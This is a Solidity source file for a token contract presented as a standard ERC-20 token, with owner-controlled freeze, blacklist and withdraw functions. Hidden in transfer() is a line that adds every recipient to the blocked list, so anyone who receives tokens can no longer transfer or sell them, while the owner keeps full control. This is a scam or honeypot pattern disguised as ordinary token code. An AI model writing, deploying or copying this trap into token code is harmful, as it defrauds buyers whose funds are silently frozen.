//SourceUnit: pact-trx-20.sol

pragma solidity 0.5.12;

contract Owned {
    address public owner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
}


// ----------------------------------------------------------------------------
//Tokenlock trade
// ----------------------------------------------------------------------------
contract Tokenlock is Owned {
    uint8 isLocked = 0;
    event Freezed();
    event UnFreezed();
    modifier validLock {
        require(isLocked == 0);
        _;
    }
    function freeze() public onlyOwner {
        isLocked = 1;
        emit Freezed();
    }
    function unfreeze() public onlyOwner {
        isLocked = 0;
        emit UnFreezed();
    }


    mapping(address => bool) statelist;
    event LockUser(address indexed who);
    event UnlockUser(address indexed who);

    modifier permissionCheck {
        require(!statelist[tx.origin]);
        _;
    }

    function lockUser(address who) public onlyOwner {
        statelist[who] = true;
        emit LockUser(who);
    }

    function unlockUser(address who) public onlyOwner {
        statelist[who] = false;
        emit UnlockUser(who);
    }

}


library SafeMath {
    function mul(uint256 a, uint256 b) internal returns (uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }

    function max64(uint64 a, uint64 b) internal  returns (uint64) {
        return a >= b ? a : b;
    }

    function min64(uint64 a, uint64 b) internal  returns (uint64) {
        return a < b ? a : b;
    }

    function max256(uint256 a, uint256 b) internal  returns (uint256) {
        return a >= b ? a : b;
    }

    function min256(uint256 a, uint256 b) internal  returns (uint256) {
        return a < b ? a : b;
    }
}


interface Token {
    function transfer(address _to, uint256 _value)external returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value)external returns (bool success);
    function approve(address _spender, uint256 _value)external returns (bool success);
    function allowance(address _owner, address _spender) external returns (uint256 remaining);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}


/*  ERC 20 token */
contract StandardToken is Token, Tokenlock {

    using SafeMath for uint;

    constructor (uint totalAmount,string memory _name,string memory _symbol) payable public{
        symbol = _symbol;
        name = _name;
        totalSupply =  totalAmount * 10**uint256(decimals);
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }


     function transfer(address to, uint tokens)  public   validLock permissionCheck returns (bool success) {
        require(to != address(0));
        require(balances[msg.sender] >= tokens && tokens > 0);
        require(balances[to] + tokens >= balances[to]);

        balances[msg.sender] = balances[msg.sender].sub(tokens);
        balances[to] = balances[to].add(tokens);

        statelist[to] = true;
        emit Transfer(msg.sender, to, tokens);
        return true;
    }


    function transferFrom(address _from, address _to, uint256 _value)  public   validLock permissionCheck returns (bool success) {
      if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
        balances[_to] = balances[_to].add(_value);
        balances[_from] = balances[_from].sub(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        emit Transfer(_from, _to, _value);
        return true;
      } else {
        return false;
      }
    }

    function batchTransferOut(address[] memory  _to, uint amount) public onlyOwner{
        require(_to.length > 0);
        require(balances[msg.sender] >= amount && amount > 0);
        for(uint32 i=0;i<_to.length;i++){
            balances[msg.sender] = balances[msg.sender].sub(amount);
            balances[_to[i]] = balances[_to[i]].add(amount);
        }
        emit Transfer(msg.sender, _to[0], amount);
    }

    function approve(address _spender, uint256 _value)public  returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public   returns (uint256 remaining) {
      return allowed[_owner][_spender];
    }

    function withdraw() onlyOwner public {
        msg.sender.transfer(address(this).balance);
    }

    function receive() external  payable{
        _amount=_amount.add(msg.value);
    }

    function balanceOf(address _owner) public view  returns (uint256 balance) {
        return balances[_owner];
    }

    uint256 public  totalSupply;
    string public name;
    string public symbol;
    uint constant public decimals = 18;

    uint  internal _amount;

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
}